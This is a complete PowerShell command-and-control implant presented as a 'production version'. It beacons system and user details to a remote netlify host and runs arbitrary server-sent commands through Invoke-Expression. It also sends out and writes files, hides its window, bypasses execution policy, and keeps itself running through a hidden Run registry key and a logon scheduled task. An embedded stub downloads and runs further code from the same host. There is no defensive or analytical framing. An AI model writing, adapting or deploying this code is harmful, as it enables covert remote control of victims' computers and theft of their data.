# C2 PowerShell Stub - Production Version
param(
    [string]$C2Server = "https://vcc-library.netlify.app/erickparker",
    [int]$BeaconInterval = 15
)

# Generate or load persistent session ID
$SessionIDFile = "$env:TEMP\c2_session.txt"
if (Test-Path $SessionIDFile) {
    $Script:SessionID = Get-Content $SessionIDFile -Raw
} else {
    $Script:SessionID = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object {[char]$_})
    $Script:SessionID | Out-File $SessionIDFile -Encoding UTF8
}

$Script:C2Config = @{
    Server = $C2Server
    Interval = $BeaconInterval
    SessionID = $Script:SessionID
    Running = $true
}

# Registry persistence
function Install-Persistence {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        
        # Get current script path - handle different execution contexts
        $scriptPath = ""
        if ($MyInvocation.MyCommand.Path) {
            $scriptPath = $MyInvocation.MyCommand.Path
        } elseif ($PSCommandPath) {
            $scriptPath = $PSCommandPath
        } else {
            # If running in memory, create a copy first
            $scriptPath = "$env:TEMP\c2_stub.ps1"
            $currentScript = @"
# C2 PowerShell Stub - Production Version
param(
    [string]`$C2Server = "https://vcc-library.netlify.app/erickparker",
    [int]`$BeaconInterval = 15
)

# Generate or load persistent session ID
`$SessionIDFile = "`$env:TEMP\c2_session.txt"
if (Test-Path `$SessionIDFile) {
    `$Script:SessionID = Get-Content `$SessionIDFile -Raw
} else {
    `$Script:SessionID = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object {[char]`$_})
    `$Script:SessionID | Out-File `$SessionIDFile -Encoding UTF8
}

`$Script:C2Config = @{
    Server = `$C2Server
    Interval = `$BeaconInterval
    SessionID = `$Script:SessionID
    Running = `$true
}

# Download and execute the real stub
irm "https://vcc-library.netlify.app/erickparker/stub" -OutFile "`$env:TEMP\c2_real.ps1"
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "`$env:TEMP\c2_real.ps1"
"@
            $currentScript | Out-File $scriptPath -Encoding UTF8
        }
        
        # Random registry name
        $regName = -join ((65..90) | Get-Random -Count 8 | ForEach-Object {[char]$_})
        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
        
        # Scheduled task persistence
        $taskName = -join ((65..90) | Get-Random -Count 10 | ForEach-Object {[char]$_})
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -RunLevel Highest
        
        Write-Host "Persistence installed at: $scriptPath"
    } catch {
        Write-Host "Persistence failed: $($_.Exception.Message)"
    }
}

function Send-Beacon {
    try {
        $beaconData = @{
            session_id = $Script:C2Config.SessionID
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            domain = $env:USERDOMAIN
            os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
            arch = $env:PROCESSOR_ARCHITECTURE
            ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike "169.254.*" -and $_.IPAddress -notlike "127.*" } | Select-Object -First 1).IPAddress
            timestamp = [int][double]::Parse((Get-Date -UFormat %s))
            processes = (Get-Process).Count
        }
        
        $jsonData = $beaconData | ConvertTo-Json -Compress
        $encryptedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($jsonData))
        
        $response = Invoke-RestMethod -Uri "$($Script:C2Config.Server)/beacon" -Method POST -Body @{data=$encryptedData} -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -TimeoutSec 15 -ErrorAction Stop
        
        if ($response -and $response.commands) {
            Write-Host "Received $($response.commands.Count) commands"
            foreach ($cmd in $response.commands) {
                Write-Host "Executing: $($cmd.type)"
                $result = Execute-Command -Command $cmd
                Write-Host "Result: $result"
                
                $resultData = @{session_id = $Script:C2Config.SessionID; command_id = $cmd.id; result = $result}
                $jsonData = $resultData | ConvertTo-Json -Compress
                $encryptedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($jsonData))
                Invoke-RestMethod -Uri "$($Script:C2Config.Server)/result" -Method POST -Body @{data=$encryptedData} -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -TimeoutSec 5 -ErrorAction SilentlyContinue
            }
        } else {
            Write-Host "No commands received"
        }
    } catch {
        Write-Host "Beacon failed: $($_.Exception.Message)"
        Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 180)
    }
}

function Execute-Command {
    param($Command)
    
    $cmdType = $Command.type
    $cmdPayload = $Command.payload
    
    switch ($cmdType) {
        "powershell" {
            try {
                $output = Invoke-Expression -Command $cmdPayload 2>&1
                return $output -join "`n"
            } catch {
                return "Error: $($_.Exception.Message)"
            }
        }
        "download" {
            try {
                $fileData = [System.IO.File]::ReadAllBytes($cmdPayload)
                $base64 = [System.Convert]::ToBase64String($fileData)
                return @{type="file"; name=(Split-Path $cmdPayload -Leaf); data=$base64}
            } catch {
                return "Error downloading file: $($_.Exception.Message)"
            }
        }
        "upload" {
            try {
                $fileData = [System.Convert]::FromBase64String($cmdPayload.data)
                [System.IO.File]::WriteAllBytes($cmdPayload.path, $fileData)
                return "File uploaded successfully"
            } catch {
                return "Error uploading file: $($_.Exception.Message)"
            }
        }
        "sleep" {
            Start-Sleep -Seconds $cmdPayload
            return "Sleep completed for $cmdPayload seconds"
        }
        "persistence" {
            Install-Persistence
            return "Persistence mechanisms installed"
        }
        "info" {
            $info = @{
                computer = $env:COMPUTERNAME
                user = $env:USERNAME
                domain = $env:USERDOMAIN
                os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
                arch = $env:PROCESSOR_ARCHITECTURE
                ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike "169.254.*" -and $_.IPAddress -notlike "127.*" } | Select-Object -First 1).IPAddress
                processes = (Get-Process).Count
                admin = ([System.Security.Principal.WindowsPrincipal]::new([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))
                path = $MyInvocation.MyCommand.Path
            }
            return $info | ConvertTo-Json -Compress
        }
        default {
            return "Unknown command type: $cmdType"
        }
    }
}

function Main {
    # Hide window
    try {
        $windowStyle = -1
        $signature = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        $type = Add-Type -MemberDefinition $signature -Name "Win32ShowWindowAsync" -PassThru
        $type::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, $windowStyle)
    } catch {
        # Continue if window hiding fails
    }
    
    # Install persistence
    Install-Persistence
    
    Write-Host "Starting C2 client..."
    Write-Host "Session ID: $Script:C2Config.SessionID"
    
    # Initial beacon
    Send-Beacon
    
    # Main beacon loop
    while ($Script:C2Config.Running) {
        Send-Beacon
        Start-Sleep -Seconds $Script:C2Config.Interval
        
        # Randomize interval slightly (15-60 seconds)
        $Script:C2Config.Interval = $Script:C2Config.Interval + (Get-Random -Minimum -5 -Maximum 10)
        $Script:C2Config.Interval = [Math]::Max(15, [Math]::Min(60, $Script:C2Config.Interval))
    }
}

try {
    Main
} catch {
    # Silent exit on any error
}
